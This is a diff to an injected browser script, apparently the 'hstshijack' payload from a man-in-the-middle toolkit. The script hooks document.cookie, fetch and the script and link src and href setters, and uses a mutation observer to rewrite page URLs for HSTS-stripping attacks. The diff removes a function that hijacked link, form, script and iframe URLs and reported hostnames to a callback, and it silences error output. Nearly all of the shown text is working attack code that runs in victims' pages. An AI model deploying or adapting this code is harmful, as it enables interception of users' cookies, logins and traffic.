@@ -32,6 +32,8 @@
 		obf_hstshijack_scriptSrcSetter = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, "src").set,
 		obf_hstshijack_linkHrefSetter = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, "href").set;
 
+	const obf_hstshijack_sleep = obf_hstshijack_ms => new Promise(obf_hstshijack_res => setTimeout(obf_hstshijack_res, obf_hstshijack_ms));
+
 	const obf_hstshijack_mutation_observer = new MutationObserver(function(obf_hstshijack_mutations) {
 		obf_hstshijack_mutations.forEach(function(obf_hstshijack_mutation) {
 			if (obf_hstshijack_mutation.type === "childList") {
@@ -260,7 +262,6 @@
 	};
 
 	const obf_hstshijack_hookCookieGetterAndSetter = async () => {
-		const obf_hstshijack_sleep = obf_hstshijack_ms => new Promise(obf_hstshijack_res => setTimeout(obf_hstshijack_res, obf_hstshijack_ms));
 		while (document === undefined) await obf_hstshijack_sleep(0);
 		const obf_hstshijack_originalCookieGetter = Object.getOwnPropertyDescriptor(Document.prototype, "cookie").get,
 			obf_hstshijack_originalCookieSetter = Object.getOwnPropertyDescriptor(Document.prototype, "cookie").set;
@@ -380,47 +381,6 @@
 		}
 	};
 
-	const obf_hstshijack_hookNodes = () => {
-		document.querySelectorAll("a,form,script,iframe").forEach(function(obf_hstshijack_node){
-			try {
-				let obf_hstshijack_url = "";
-				switch (obf_hstshijack_node.tagName) {
-				case "A" || "LINK":
-					obf_hstshijack_node.href ? obf_hstshijack_url = obf_hstshijack_node.href : "";
-					if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
-						let obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
-						if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
-							obf_hstshijack_node.href = obf_hstshijack_hijacked_url;
-						}
-					}
-					break;
-				case "FORM":
-					obf_hstshijack_node.action ? obf_hstshijack_url = obf_hstshijack_node.action : "";
-					if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
-						let obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
-						if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
-							obf_hstshijack_node.action = obf_hstshijack_hijacked_url;
-						}
-					}
-					break;
-				case "SCRIPT" || "IFRAME":
-					obf_hstshijack_node.src ? obf_hstshijack_url = obf_hstshijack_node.src : "";
-					if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
-						let obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
-						if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
-							obf_hstshijack_node.src = obf_hstshijack_hijacked_url;
-						}
-					}
-					break;
-				}
-				if (obf_hstshijack_url) {
-					const obf_hstshijack_parsed_url = obf_hstshijack_parseURL(obf_hstshijack_url);
-					obf_hstshijack_sendCallback(obf_hstshijack_parsed_url[1].toLowerCase());
-				}
-			} catch(obf_hstshijack_ignore) {}
-		});
-	};
-
 	try {
 		obf_hstshijack_hookCookieGetterAndSetter();
 	} catch(obf_hstshijack_ignore) {}
@@ -449,16 +409,13 @@
 		obf_hstshijack_hookFetch();
 	} catch(obf_hstshijack_ignore) {}
 
-//	try {
-//		obf_hstshijack_hookNodes();
-//	} catch(obf_hstshijack_ignore) {}
-
 	try {
+		while (document === undefined) await obf_hstshijack_sleep(0);
 		obf_hstshijack_mutation_observer.observe(document.documentElement, {
 			childList: true,
 			subtree: true,
 			attributes: true,
 		});
 	} catch(obf_hstshijack_ignore) {}
-})().catch((err) => console.error(err));
+})().catch(() => {});
 
